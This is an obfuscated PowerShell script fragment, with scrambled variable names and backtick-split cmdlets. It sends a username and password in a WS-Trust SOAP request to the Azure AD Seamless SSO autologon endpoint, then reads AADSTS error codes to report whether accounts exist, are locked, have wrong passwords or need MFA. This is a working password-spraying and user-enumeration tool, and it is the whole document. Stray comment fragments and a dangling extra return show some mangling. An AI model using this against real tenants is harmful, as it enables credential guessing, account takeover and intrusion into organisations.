                $YQsuPXOuENzRdNTOITSAwKLSolhuH = (New-Guid).ToString()

                $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR = $Args[0]
$VmXAJuSpYNKntMQgAQSUrenlokzDAdzwdfS = $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR.Split("@")[1]
                $iKaAUbpyBmiPjieIeSmfOnaJpP = $Args[1]

                $zwMVrbfmFvdtalfTIIyO = Get-Date
                $fOfRzLqHHIhlGnUqWufFzpcqxhpSHjXK = $zwMVrbfmFvdtalfTIIyO.toUniversalTime().toString("o")
                $zxpRkcedOFrqMJwtiUgeEMlhxPuXLzynAKPUBvTzpCi = $zwMVrbfmFvdtalfTIIyO.addMinutes(10).toUniversalTime().toString("o")

               $trmwXvmWcXmnuqMJpGuXWf = "https://autologon.microsoftazuread-sso.com/$VmXAJuSpYNKntMQgAQSUrenlokzDAdzwdfS/winauth/trust/2005/usernamemixed?client-request-id=$YQsuPXOuENzRdNTOITSAwKLSolhuH"
              
                $VPVCJlnuMPkoyzOHTsDfoSAaR=@"
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>$trmwXvmWcXmnuqMJpGuXWf</wsa:To>
        <wsa:MessageID>urn:uuid:$((New-Guid).ToString())</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>$fOfRzLqHHIhlGnUqWufFzpcqxhpSHjXK</wsu:Created>
                <wsu:Expires>$zxpRkcedOFrqMJwtiUgeEMlhxPuXLzynAKPUBvTzpCi</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-$((New-Guid).toString())">
                <wsse:Username>$lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR</wsse:Username>
                <wsse:Password>$iKaAUbpyBmiPjieIeSmfOnaJpP</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
"@
                $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = $false

                try
                {
                    $KiLOpAyRGEUTzuBMqUVcZiToSrBXBGshmf = Invoke-RestMethod -UseBasicParsing -Uri $trmwXvmWcXmnuqMJpGuXWf -Method Post -VPVCJlnuMPkoyzOHTsDfoSAaR $VPVCJlnuMPkoyzOHTsDfoSAaR -ErrorAction SilentlyContinue
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = $true # Microsoft".
                }
                catch
                {
                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs = $_.Exception.Response.GetResponseStream()
                    $SweSFOKenqPloJDjxJncrkF = ne`w-`obje`ct byte[] $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Length

                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Position = 0
                    $TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Read($SweSFOKenqPloJDjxJncrkF,0,$TOfEVskWJuVgrJTRRIXYeAmxUGwnKJAdjDmquxQs.Length) | Out-Null
            
                    $JpuivkAbQyPatutzGYcvojVBoETzstiMBUrr = [xml][text.encoding]::UTF8.GetString($SweSFOKenqPloJDjxJncrkF)

                    $errorDetails = $JpuivkAbQyPatutzGYcvojVBoETzstiMBUrr.Envelope.Body.Fault.Detail.error.internalerror.text
                }

            # Microsoft".
            if(!$jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa -and $errorDetails)
            {
                if($errorDetails.startsWith("AADSTS50053")) # Microsoft".
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "locked"
                }
                elseif($errorDetails.StartsWith("AADSTS50126")) # Microsoft".
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "bad password"
                }
                elseif($errorDetails.StartsWith("AADSTS50056")) 
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "exists w/no password"
                }
                elseif($errorDetails.StartsWith("AADSTS50014")) 
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "exists, but max passthru auth time exceeded"
                }
                elseif($errorDetails.StartsWith("AADSTS50076")) # Microsoft".
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "need mfa"
                }
                elseif($errorDetails.StartsWith("AADSTS700016")) # Microsoft".
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "no app"
                }
                elseif($errorDetails.StartsWith("AADSTS50034")) # Microsoft".
                {
                    $jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa = "no user"
                }
                else
                {
                    Remove-Variable exists
                }
            }

        return $lLTObErglyerxhSnHOhOWuHYcdnBVSCQfXMJEcGUrRUGR+"		"+$jcazBuJSdTuzwoSfFxqlvgVWGbhvKGOxercZTfa
        return $errorDetails

